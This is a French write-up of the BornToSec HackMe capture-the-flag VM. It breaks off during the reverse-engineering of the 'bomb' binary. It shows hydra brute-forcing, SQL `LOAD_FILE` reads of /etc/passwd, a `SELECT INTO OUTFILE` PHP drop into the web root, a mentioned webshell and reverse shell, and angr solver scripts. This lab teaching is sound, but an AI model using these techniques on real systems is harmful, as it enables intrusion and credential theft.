# Solution du CTF BornToSec HackMe v1.1 de l'école 42

Il y a quelques années de cela, un ancien collègue m'avait partagé un CTF qui provenait de l'école 42.

Après avoir résolu ce CTF qui mélangeait exploitation classique et Jeopardy (via une épreuve de reverse-engineering) j'avais quand même un avis mitigé.

De mémoire il y avait eu un peu de guessing avec des indications peu claires ou manquantes et surtout le binaire (que j'avais regerse-engineeré de façon classique) offrait bien magré lui des solutions multiples alors que ces solutions servent à générer un password pour les étapes qui suivent.

Pour finir, je n'avais pas publié de writeup à l'époque car l'exécutable me semblait une aubaine pour se lancer dans l'utilisation d'[angr: A powerful and user-friendly binary analysis platform!](https://github.com/angr/angr) et j'ai longtemps remis à plus tard son apprentissage.

Je n'ai pas de site officiel pour fournir le ien du CTF. A l'heure actuelle l'ISO est présent sur [GitHub - nirae/packer_42_projects_boxes](https://github.com/nirae/packer_42_projects_boxes) mais sinon l'ISO se nomme `BornToSecHackMe-v1.1.iso` et son hash MD5 est `8f6b7f863fab5c684dbee11151b93426`.

```
Nmap scan report for borntosec (192.168.56.66)
Host is up (0.00019s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 07bf0220f08ac8481efc41aea446fa25 (DSA)
|   2048 26dd80a3dfc44b531e534246ef6e30b2 (RSA)
|_  256 cfc38c31d7477c84e2d21631b28e63a7 (ECDSA)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hack me if you can
|_http-server-header: Apache/2.2.22 (Ubuntu)
143/tcp open  imap       Dovecot imapd
|_imap-capabilities: IDLE more listed have Pre-login IMAP4rev1 OK capabilities ENABLE post-login SASL-IR ID LOGINDISABLEDA0001 STARTTLS LOGIN-REFERRALS LITERAL+
|_ssl-date: 2022-11-26T15:24:00+00:00; -2d04h42m52s from scanner time.
443/tcp open  ssl/http   Apache httpd 2.2.22
|_http-title: 404 Not Found
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_ssl-date: 2022-11-26T15:24:01+00:00; -2d04h42m52s from scanner time.
993/tcp open  ssl/imaps?
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_ssl-date: 2022-11-26T15:24:01+00:00; -2d04h42m52s from scanner time.
```

## Bad OPSEC

On peut voir ici que le serveur FTP défaille, potentiellement du à un problème de configuration. Il est sensé fournir un accès à certains fichiers mais, comme on le verra par la suite, on peut très bien parvenir à nos fins autrement.

Sur les services HTTP on trouve des liens sociaux vers l'école 42 mais rien d'utile pour le challenge. On note toutefois le `commonName` défini à `borntosec` dans le certificat SSL et on ajoute donc une entrée dans notre fichier `/etc/hosts`.

Je lance une énumération sur le port 80 à l'aide de [feroxbuster: A fast, simple, recursive content discovery tool written in Rust.](https://github.com/epi052/feroxbuster) mais je n'obtiens pas grand chose, avec une erreur 403 pour le forum :

```
403       10l       30w      286c http://192.168.56.66/forum
301        9l       28w      314c http://192.168.56.66/fonts
403       10l       30w      294c http://192.168.56.66/server-status
```

Le port https offre plus de résultats avec déjà le forum qui est accessible ainsi qu'un webmail et une interface `phpMyAdmin` :

```
301        9l       28w      316c https://192.168.56.66/forum
301        9l       28w      318c https://192.168.56.66/webmail
301        9l       28w      321c https://192.168.56.66/phpmyadmin
403       10l       30w      295c https://192.168.56.66/server-status
```

Le forum a une signature `powered by my little forum` et on trouve différentes entrées sur *exploit-db* concernant ce logiciel mais les URLs ne concordent pas, les vulnérabilités doivent toucher d'anciennes versions.

On peut sans authentification préalable lister la totalité des utilisateurs :

- admin

- lmezard

- qudevide

- thor

- wandre

- zaz

Le seul message qui semble d'intérêt sur le forum est dans un thread baptisé `Probleme login ?` qui contient des extraits d'un `auth.log`, là où Linux stocke généralement les infos de connexions SSH. Voici les parties qui semblent les plus intéressantes :

```log
Oct 5 08:44:55 BornToSecHackMe sshd[7488]: Failed password for invalid user PlcmSpIp from 161.202.39.38 port 54827 ssh2
Oct 5 08:44:55 BornToSecHackMe sshd[7488]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:44:57 BornToSecHackMe sshd[7490]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com user=root
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard
Oct 5 15:51:48 BornToSecHackMe sshd[28139]: pam_unix(sshd:session): session opened for user admin by (uid=0)
Oct 5 15:51:48 BornToSecHackMe sshd[28292]: Received disconnect from 62.210.32.157: 11: disconnected by user
Oct 5 15:51:48 BornToSecHackMe sshd[28139]: pam_unix(sshd:session): session closed for user admin
Oct 5 16:07:01 BornToSecHackMe CRON[29216]: pam_unix(cron:session): session opened for user root by (uid=0)
```

Sur deux cas on à l'impression que l'utilisateur a saisi son mot de passe à la place de son login. Les messages de succès indiquent quand à eux l'existence des compte `lmezard`, `admin` et `root`.

Les combinaisons de ces identifiants et mots de passe sont malheureusement refusés sur le serveur SSH mais on parvient à se connecter au forum avec le compte `lmezard` et le mot de passe `!q\]Ej?*5K5cy*AJ`.

Une fois connecté on n'apprend pas grand chose de plus, on peut toutefois lire l'adresse email liée au compte qui est `laurie@borntosec.net`, on a donc une utilisatrice.

Faute de mieux on se rabat sur le webmail et on parvient à se conecter avec `laurie@borntosec.net` / `!q\]Ej?*5K5cy*AJ`

Il se peut que le webmail ait quelques réticences à vous connecter et c'est sans doute ce qui m'avait laissé un mauvais apperçu du CTF. Il semble qu'au pire on peut aussi accéder aux emails via le port imaps :

```shellsession
$ hydra -L users.txt  -P pass.txt imaps://192.168.56.66
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-28 21:46:18
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:8/p:2), ~1 try per task
[DATA] attacking imaps://192.168.56.66:993/
[993][imap] host: 192.168.56.66   login: laurie@borntosec.net   password: !q\]Ej?*5K5cy*AJ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-28 21:46:23
```

Sur le webmail on peut lire le message suivant :

| From:                                                                                            | qudevide@mail.borntosec.net   |
| ------------------------------------------------------------------------------------------------ | ----------------------------- |
| Subject:                                                                                         | DB Access                     |
| Date:                                                                                            | Thu, October 8, 2015 10:25 pm |
| To:                                                                                              | laurie@borntosec.net          |
| Hey Laurie,<br>You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$<br>Best regards. |                               |

## Dépose-minute

On se dirige alors vers le `phpMyAdmin` dans l'espoir d'y trouver une information utile. Le forum se sert de la base de données `forum_db` et les hashs des utilisateurs sontr dans la table `mlf2_userdata`.

Les hashs ne tombent pas sur *crackstation.net* et d'ailleurs ils sont d'une taille étrange, plus long que du MD5 et du SHA1 mais moins que du SHA256...

A défaut de casser les hashs on peut copier celui de `lmezard` dont on connait le clair et le mettre pour le compte `admin`. Une fois connecté on a accès à l'interface d'administration du forum. On peut activer l'upload des images et des avatars mais ces nouvelles options ne semblent pas permettre d'uploader autre chose que des images.

J'aurais pu fouiller plus en détails mais je me suis tourné vers des commandes MySQL plus classiques pour parvenir à mes fins.

Ainsi la commande SQL suivante :

```sql
SELECT LOAD_FILE( "/etc/passwd" )
```

permet de récupérer un blob avec la liste des utilisateurs (il faut soit activer l'affichage des blobs dans `phpMyAdmin` soit exporter vers un format utilisable comme JSON)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
--- snip ---
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:110:118::/var/spool/postfix:/bin/false
```

J'ai procédé à la même opération pour le fichier `/etc/os-release` pour identifier l'OS :

`Ubuntu precise (12.04.5 LTS)`

Une petite recherche sur le web permet de déterminer comment est organisé la configuration Apache sur ce système. Heureusement le nom du fichier de configuration par défaut pour le virtual host n'a pas été changé (`/etc/apache2/sites-enabled/000-default`).

En voici les grandes lignes :

```apacheconf
<VirtualHost *:80>                                                                                                     
    ServerAdmin webmaster@localhost                                                                                    
    ServerName BorntoSec                                                                                               
    DocumentRoot /var/www                                                                                              
                                                                                                                       
    <Directory /var/www/forum>                                                                                         
        SSLRequireSSL                                                                                                  
    </Directory>                                                                                                       
    <Directory /var/www/>                                                                                              
        allow from all                                                                                                 
    </Directory>                                                                                                       
</VirtualHost>                                                                                                         
                                                                                                                       
<VirtualHost *:443>                                                                                                    
    ServerAdmin webmaster@localhost                                                                                    
    SSLEngine On                                                                                                       
    SSLCertificateFile /etc/ssl/private/localhost.pem                                                                  
                                                                                                                       
Alias /phpmyadmin /usr/share/phpmyadmin                                                                                
<Directory /usr/share/phpmyadmin>                                                                                      
    Options FollowSymLinks                                                                                             
    DirectoryIndex index.php                                                                                           
    AllowOverride All                                                                                                  
                                                                                                                       
    <IfModule mod_php5.c>                                                                                              
        AddType application/x-httpd-php .php                                                                           
        php_flag magic_quotes_gpc Off                                                                                  
        php_flag track_vars On                                                                                         
        php_flag register_globals Off                                                                                  
        php_admin_flag allow_url_fopen Off                                                                             
        php_value include_path .                                                                                       
        php_admin_value upload_tmp_dir /var/lib/phpmyadmin/tmp                                                         
        php_admin_value open_basedir /usr/share/phpmyadmin/:/etc/phpmyadmin/:/var/lib/phpmyadmin/                      
    </IfModule>                                                                                                        
</Directory>                                                                                                           
                                                                                                                       
Alias /forum /var/www/forum                                                                                            
<Directory /var/www/forum>                                                                                             
    Options Indexes FollowSymLinks MultiViews                                                                          
    <IfModule mod_php5.c>                                                                                              
        php_flag register_globals off                                                                                  
    </IfModule>                                                                                                        
    <IfModule mod_dir.c>                                                                                               
        DirectoryIndex index.php                                                                                       
    </IfModule>                                                                                                        
</Directory>

Alias /webmail /usr/share/squirrelmail                                                                                 
<Directory /usr/share/squirrelmail>                                                                                    
    Options FollowSymLinks                                                                                             
        <IfModule mod_php5.c>                                                                                          
            php_flag register_globals off                                                                              
        </IfModule>                                                                                                    
        <IfModule mod_dir.c>                                                                                           
            DirectoryIndex index.php                                                                                   
        </IfModule>                                                                                                    
                                                                                                                       
        <Files configtest.php>                                                                                         
            order deny,allow                                                                                           
            deny from all                                                                                              
            allow from 127.0.0.1                                                                                       
        </Files>                                                                                                       
    </Directory>                                                                                                       
</VirtualHost>
```

A ce stade de notre connaissance du système, l'objectif est de pouvoir déposer un script PHP sous la racine web du site. On sait que le forum est installé dans `/var/www/forum` donc on va essayer d'écrire sous ce dossier.

Il m'aura fallut plusieurs tentatives (avec l'aide de `Feroxbuster` pour lister les sous-dossiers existants) avant de trouver un emplacement où l'écriture est autorisée.

Cette requête me permet de créer un `phpinfo` dans le dossier de templates du forum :

```sql
SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/forum/templates_c/dvinfo.php'
```

J'y apprend que la machine est en 32 bits et que l'utilisateur courant est `www-data`. De la même façon je dépose un webshell.

Je l'utilise pour rappatrier `reverse-ssh` en 32 bits à l'aide de `wget` puis, une fois le tunnel SSH établit, je fouille un peu puis trouve un dossier intéressan dans `/home` :

```
www-data@BornToSecHackMe:/$ ls /home/
total 0
drwxrwx--x 1 www-data             root                  60 Oct 13  2015 .
drwxr-xr-x 1 root                 root                 220 Nov 26 17:04 ..
drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net  60 Oct 15  2015 laurie@borntosec.net
dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
```

Le dossier contient un fichier qui renferme des identifiants :

```shellsession
www-data@BornToSecHackMe:/home/LOOKATME$ cat password 
lmezard:G!@M6f4Eatau{sF"
```

## Rest In Pieces

On peut alors changer d'utilisateur (via `su`) et découvrir de nouveaux fichiers :

```shellsession
lmezard@BornToSecHackMe:~$ ls -al
total 791
dr-xr-x--- 2 lmezard  lmezard     61 Oct 15  2015 .
drwxrwx--x 1 www-data root        60 Oct 13  2015 ..
-rw-r--r-- 1 root     root         1 Oct 15  2015 .bash_history
-rwxr-x--- 1 lmezard  lmezard 808960 Oct  8  2015 fun
-rwxr-x--- 1 lmezard  lmezard     96 Oct 15  2015 README
lmezard@BornToSecHackMe:~$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
lmezard@BornToSecHackMe:~$ file fun
fun: POSIX tar archive (GNU)
```

Cette archive contient 750 fichiers PCAP qui n'en sont en réalité pas (ce ne sont pas des captures réseau). Il s'agit en réalité de boût de code d'un programme C.

Les fichiers font tous moins de 50 octets, sauf un, où l'on peut lire ça au milieu des lignes :

```c
int main() {
        printf("M");
        printf("Y");
        printf(" ");
        printf("P");
        printf("A");
        printf("S");
        printf("S");
        printf("W");
        printf("O");
        printf("R");
        printf("D");
        printf(" ");
        printf("I");
        printf("S");
        printf(":");
        printf(" ");
        printf("%c",getme1());
        printf("%c",getme2());
        printf("%c",getme3());
        printf("%c",getme4());
        printf("%c",getme5());
        printf("%c",getme6());
        printf("%c",getme7());
        printf("%c",getme8());
        printf("%c",getme9());
        printf("%c",getme10());
        printf("%c",getme11());
        printf("%c",getme12());
        printf("\n");
        printf("Now SHA-256 it and submit");
}
```

Les fonctions `getme` ne sont pas toutes dans le même fichier, il faut donc recoller les morceaux.

Un programme C commence normalement par les directives `#include`. Un simple `grep` me retourne le fichier qui contient la directive. Son contenu est le suivant :

```c
#include <stdio.h>

//file1
```

Intéressant ! Les fichiers sont donc numérotés via un commentaire dans le fichier lui même.

J'ai écrit ce script Python pour recoller les morceaux :

```python
from glob import glob
import re

FILE_NUM = re.compile(r"//file(\d+)")
parts = {}

for filename in glob("*.pcap"):
    data = open(filename).read()
    num = int(FILE_NUM.search(data).group(1))
    parts[num] = filename

with open("prog.c", "w") as fd:
    for i in sorted(parts):
        fd.write(open(parts[i]).read())
        fd.write("\n")
```

On compile le code C compilé et on exécute :

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

Comme indiqué dans le README on génère le hash sha256 :

```shellsession
$ echo -n Iheartpwnage | sha256sum 
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

Et on peut se connecter via SSH au compte `laurie`.

## Avec Colr

On a une fois de plus deux fichiers présents :

```shellsession
laurie@BornToSecHackMe:~$ ls -l
total 27
-rwxr-x--- 1 laurie laurie 26943 Oct  8  2015 bomb
-rwxr-x--- 1 laurie laurie   158 Oct  8  2015 README
laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

Le fichier `bomb` est un exécutable 32 bits non strippé (les noms des fonctions apparaissentt dans un désassembleur comme `Cutter`) ce qui facilite l'analyse.

J'ai prévu d'utiliser `angr` pour résoudre le CTF mais `angr` c'est quoi au juste ? D'après le site officiel :

> angr is a multi-architecture binary analysis toolkit, with the capability to perform dynamic symbolic execution (like Mayhem, KLEE, etc.) and various static analyses on binaries.

Au lieu d'analyser un flot d'exécution avec des valeurs concrètes comme le fait un débogueur, `angr` va voir des emplacements mémoires auxquels sont appliqués différentes opérations tout au long de l'exécution du programme.

Ainsi au lieu de dire que le registre `eax` vaut 50 il pourra dire que `eax` vaut (à une adresse `A`) son état initial auquel on a rajouté 3 puis retiré 25 puis qu'on a muliplié par 2 etc....

Avec l'aide du solver `Z3` de Microsoft qu'il intègre, il est capable de résoudre l'équation qui permettra de trouver la valeur initiale qui se cache derrière telle ou telle valeur finale rencontrée.

Dans notre cas le binaire est découpé en 6 étapes que l'on doit résoudre en saisissant des données particulières. `angr` va nous servir à trouver les données à saisir sans regarder le corps des fonctions qui définissent ces étapes, juste en déclarant où se trouvera la donnée initiale et quel état le programme doit atteindre lorsque la solution est bonne.

Voici un exemple plus parlant puisqu'il s'agit de la première étape du binaire, après la lecture des données :

```nasm
;-- phase_1:
; arg int32_t arg_8h @ ebp+0x8
0x08048b20      push    ebp
0x08048b21      mov     ebp, esp
0x08048b23      sub     esp, 8
0x08048b26      mov     eax, dword [arg_8h]
0x08048b29      add     esp, 0xfffffff8
0x08048b2c      push    str.Public_speaking_is_very_easy. ; 0x80497c0 ; int32_t arg_ch
0x08048b31      push    eax        ; int32_t arg_8h
0x08048b32      call    strings_not_equal ; sym.strings_not_equal
0x08048b37      add     esp, 0x10
0x08048b3a      test    eax, eax
0x08048b3c      je      0x8048b43
0x08048b3e      call    explode_bomb ; sym.explode_bomb
0x08048b43      mov     esp, ebp
0x08048b45      pop     ebp
0x08048b46      ret
0x08048b47      nop
```

Ici on est dans le cas de crackme le plus simple possible : la fonction reçoit une chaine de caractères en paramètre et la compare à une autre qui est hardcodé. Au simple coup d'oeil on sait que la solution est `Public speaking is very easy.`

Le code Python pour résoudre l'étape avec `angr` est le suivant :

```python
import logging
                                                                                                                       
import angr
                                                                                                                       
logging.getLogger('angr.storage').setLevel(logging.ERROR)                                                              
                                                                                                                       
BINARY = "./bomb"                                                                                                      
                                                                                                                       
def is_defused(state):                                                                                                 
    try:                                                                                                               
        return b"defused" in state.posix.dumps(1)                                                                      
    except:                                                                                                            
        return False                                                                                                   
                                                                                                                       
def is_exploded(state):                                                                                                
    try:                                                                                                               
        return b"BOOM" in state.posix.dumps(1)                                                                         
    except:                                                                                                            
        return False                                                                                                   
                                                                                                                       
def solve_flag_1():                                                                                                    
    project = angr.Project(BINARY)                                                                                     
    sm = project.factory.simulation_manager()                                                                          
    sm.use_technique(angr.exploration_techniques.DFS())                                                                
    sm.explore(find=is_defused, avoid=is_exploded)                                                                     
    print(sm.found[0].posix.dumps(0).split(b"\0")[0].decode())
```

Le code se base sur deux observations :

- quand la chaine saisie est correcte le binaire affiche `Phase 1 defused`

- quand la chaine saisie est incorrecte la bombe explose avec le message `BOOM`

Il suffit d'indiquer à `angr` où se trouve le binaire, à créer un simulation manager et lui demander de trouver les cas qui mènent au message `defused` tout en évitant ceux qui mènent au message `BOOM`.

Une fois qu'il a terminé on lui demande d'afficher ce qu'il a envoyé sur l'entrée standard du programme.

Le seul point particulier ici c'est que par défaut le code crashait sur une erreur de récursion. J'ai résolu cela en spécifiant d'utiliser une autre technique (`Depth First Search`) qui va privilégier les enbranchements les plus profonds.

## Boom shakalaka

Utiliser `angr` n'est pas la chose la plus aisée et nécessite tout de même quelques connaissances en assembleur pour comprendre où et comment sont organisés les données d'entrées et de sorties dans le binaire analysé.

Pour la seconde étape on a le code assembleur suivant :

```nasm
phase_2 (int32_t arg_8h);
; var int32_t var_28h @ ebp-0x28
; var uint32_t var_18h @ ebp-0x18
; arg int32_t arg_8h @ ebp+0x8
0x08048b48      push    ebp
0x08048b49      mov     ebp, esp
0x08048b4b      sub     esp, 0x20
0x08048b4e      push    esi
0x08048b4f      push    ebx
0x08048b50      mov     edx, dword [arg_8h]
0x08048b53      add     esp, 0xfffffff8
0x08048b56      lea     eax, [var_18h]
0x08048b59      push    eax        ; int arg_ch
0x08048b5a      push    edx        ; const char *s
0x08048b5b      call    read_six_numbers ; sym.read_six_numbers
0x08048b60      add     esp, 0x10
0x08048b63      cmp     dword [var_18h], 1
0x08048b67      je      0x8048b6e
0x08048b69      call    explode_bomb ; sym.explode_bomb
0x08048b6e      mov     ebx, 1
0x08048b73      lea     esi, [var_18h]
0x08048b76      lea     eax, [ebx + 1]
0x08048b79      imul    eax, dword [esi + ebx*4 - 4]
0x08048b7e      cmp     dword [esi + ebx*4], eax
0x08048b81      je      0x8048b88
0x08048b83      call    explode_bomb ; sym.explode_bomb
0x08048b88      inc     ebx
0x08048b89      cmp     ebx, 5     ; 5
0x08048b8c      jle     0x8048b76
0x08048b8e      lea     esp, [var_28h]
0x08048b91      pop     ebx
0x08048b92      pop     esi
0x08048b93      mov     esp, ebp
0x08048b95      pop     ebp
0x08048b96      ret
```

Ici le programme lit 6 entiers (comme le nom de la fonction l'indique). Une première comparaison est faite avec le chiffre 1 puis si tout va bien on entre dans une boucle de 5 tours qui fait une comparaison plus compliquée.

La difficulté majeure ici c'est que `angr` gère mal la fonction `scanf` qui est utilisée dans `read_six_numbers`. Il faut donc lui macher le travail pour qu'il comprenne sur quoi il doit travailler.

```python
def solve_flag_2():
    project = angr.Project(BINARY, auto_load_libs=False)
    # addr = Juste après read_six_numbers                                                                                     
    initial_state = project.factory.blank_state(addr=0x08048b60)
    ints = [initial_state.solver.BVS(f"int{i}", 8*4) for i in range(6)]
    for i in range(6):
        initial_state.memory.store(initial_state.regs.ebp - 0x18 + 4*i, ints[i], endness='Iend_BE')
                                    
    sm = project.factory.simulation_manager(initial_state, save_unconstrained=True)                                            
    sm.use_technique(angr.exploration_techniques.DFS())                                                                
    sm.explore(find=lambda s: b"Keep going" in s.posix.dumps(1), avoid=is_exploded)                                    
    found_state = sm.unconstrained[0]                                                                                        
    answers = [found_state.solver.eval(intvar, cast_to=bytes) for intvar in ints]                                            
    print(' '.join([str(unpack('<I', answer)[0]) for answer in answers]))
```

Ici je fait démarrer l'analyse juste après la fonction `read_six_numbers` qui nous embête. Je sais que les 6 entiers sont stockés dans un tableau qui commence à `$ebp-0x18` alors je crée 6 entiers symboliques de 32 bits chacun et je les place dans les différents emplacements du tableau.

La suite est similaire à l'exemple précédent : il faut chercher le cas qui affichera `Keep going` mais éviter ceux qui causent la détonation.

Ici j'ai eu une difficulté suplémentaire : `angr` ne trouvait pas une solution stable mais a relevé des cas `unconstrained` qui correspondent généralement à des crashs de l'exécutable analysé. En analysant ce cas il s'est avéré qu'il disposait de la bonne solution.

Le problème vient certainement plus d'une mauvaise utilisation d'`angr` de ma part plutôt qu'un bug dans le logiciel.

A la fin je fais afficher les valeurs attachées à mes entiers symboliques :

```shellsession
$ python defuse.py 
WARNING  | 2022-11-28 23:26:45,295 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
WARNING  | 2022-11-28 23:26:45,297 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
WARNING  | 2022-11-28 23:26:46,794 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 mem_1b_10_32{UNINITIALIZED}>
1 2 6 24 120 720
```

## Paris sous les bombes

Sans entrer dans les détails (ce n'est pas l'objectif ici), le code de la troisième étape n'a pas de boucles mais pas mal d'enbranchements qui correspondent à de multiples valeurs possibles.

Ce qui nous importe ici c'est que le programme effectue un scanf avec `%d %c %d` donc un entier, un caractère et un autre entier.

Le code pour `angr` est très proche du précédent :

```python
def solve_flag_3():                                                                                                    
    start = 0x08048bbc                                                                                                 
    end = 0x08048aae                                                                                                   
    project = angr.Project(BINARY, auto_load_libs=False)                                                               
    state = project.factory.blank_state(addr=start)                                                                    
    int1 = state.solver.BVS("int1", 8*4)                                                                               
    state.memory.store(state.regs.ebp - 0xc, int1, endness='Iend_BE')                                                  
    char = state.solver.BVS("char", 8*4)                                                                               
    state.memory.store(state.regs.ebp - 0xc + 4, char, endness='Iend_LE')                                              
    int2 = state.solver.BVS("int2", 8*4)                                                                               
    state.memory.store(state.regs.ebp - 0xc + 8, int2, endness='Iend_BE')                                              
                                                                                                                       
    sm = project.factory.simulation_manager(state, save_unconstrained=True)                                            
    sm.explore(find=end, avoid=0x080494fc)                                                                             
    for found in sm.unconstrained:                                                                                     
        print(                                                                                                         
            unpack("<I", found.solver.eval(int1, cast_to=bytes))[0],                                                   
            chr(found.solver.eval(char, cast_to=bytes)[0]),                                                            
            unpack("<I", found.solver.eval(int2, cast_to=bytes))[0],                                                   
        )
```

J'ai défini `start` à l'adresse de l'instruction juste après le `scanf`.

Cette fois l'option passée à `find` n'est pas une chaine de caractère qui doit s'afficher mais simplement l'adresse à atteindre (qui correspond en fait à l'affichage du message de succès donc ça revient au même).

Exécution :

```shellsession
$ python defuse.py 
WARNING  | 2022-11-28 23:42:23,130 | cle.backends.externs | Symbol was allocated without a known size; emulation may fail if it is used non-opaquely: __ctype_b
WARNING  | 2022-11-28 23:42:23,132 | cle.loader     | For more information about "Symbol was allocated without a known size", see https://docs.angr.io/extending-angr/environment#simdata
WARNING  | 2022-11-28 23:42:25,753 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 mem_f_7_32{UNINITIALIZED}>
WARNING  | 2022-11-28 23:42:26,122 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 mem_f_7_32{UNINITIALIZED}>
WARNING  | 2022-11-28 23:42:26,508 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 mem_f_7_32{UNINITIALIZED}>
WARNING  | 2022-11-28 23:42:26,883 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 mem_f_7_32{UNINITIALIZED}>
WARNING  | 2022-11-28 23:42:27,255 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 mem_f_7_32{UNINITIALIZED}>
WARNING  | 2022-11-28 23:42:27,624 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 mem_f_7_32{UNINITIALIZED}>
WARNING  | 2022-11-28 23:42:27,991 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 mem_f_7_32{UNINITIALIZED}>
WARNING  | 2022-11-28 23:42:28,367 | angr.engines.successors | Exit state has over 256 possible solutions. Likely unconstrained; skipping. <BV32 mem_f_7_32{UNINITIALIZED}>
4 o 160
3 k 251
5 t 458
2 b 755
6 v 780
1 b 214
7 b 524
0 q 777
```

Ici on a des solutions multiples. L'indice donné au début (dans le fichier `README`) indique que la solution doit avoir un `b` en seconde position. Ca nous laisse toutefois 3 possibilités.

La bonne sera en fait `1 b 214`.

## C'est de la bombe bébé

La quatrième phase semble plutôt basique à première vue avec la lecture d'un seul entier, des calculs et une comparaison finale avec la valeur 55 :

```nasm
phase_4 (const char *s);
; var va_list args @ ebp-0x4
; arg const char *s @ ebp+0x8
0x08048ce0      push    ebp
0x08048ce1      mov     ebp, esp
0x08048ce3      sub     esp, 0x18
0x08048ce6      mov     edx, dword [s]
0x08048ce9      add     esp, 0xfffffffc
0x08048cec      lea     eax, [args]
0x08048cef      push    eax        ; va_list args
0x08048cf0      push    0x8049808  ; const char *format
0x08048cf5      push    edx        ; const char *s
0x08048cf6      call    sscanf     ; sym.imp.sscanf ; int sscanf(const char *s, const char *format, va_list args)
0x08048cfb      add     esp, 0x10
0x08048cfe      cmp     eax, 1     ; 1
0x08048d01      jne     0x8048d09
0x08048d03      cmp     dword [args], 0
0x08048d07      jg      0x8048d0e
0x08048d09      call    explode_bomb ; sym.explode_bomb
0x08048d0e      add     esp, 0xfffffff4
0x08048d11      mov     eax, dword [args]
0x08048d14      push    eax        ; int32_t arg_8h
0x08048d15      call    func4      ; sym.func4
0x08048d1a      add     esp, 0x10
0x08048d1d      cmp     eax, 0x37  ; 55
0x08048d20      je      0x8048d27
0x08048d22      call    explode_bomb ; sym.explode_bomb
0x08048d27      mov     esp, ebp
0x08048d29      pop     ebp
0x08048d2a      ret
```

Mais les calculs sont effectués dans la fonction `func4` qui fait de la double-récursivité (elle s'appelle deux fois) :

```nasm
func4 (va_list arg_8h);
; var int32_t var_18h @ ebp-0x18
; arg va_list arg_8h @ ebp+0x8
0x08048ca0      push    ebp
0x08048ca1      mov     ebp, esp
0x08048ca3      sub     esp, 0x10
0x08048ca6      push    esi
0x08048ca7      push    ebx
0x08048ca8      mov     ebx, dword [arg_8h]
0x08048cab      cmp     ebx, 1     ; 1
0x08048cae      jle     0x8048cd0
0x08048cb0      add     esp, 0xfffffff4
0x08048cb3      lea     eax, [ebx - 1]
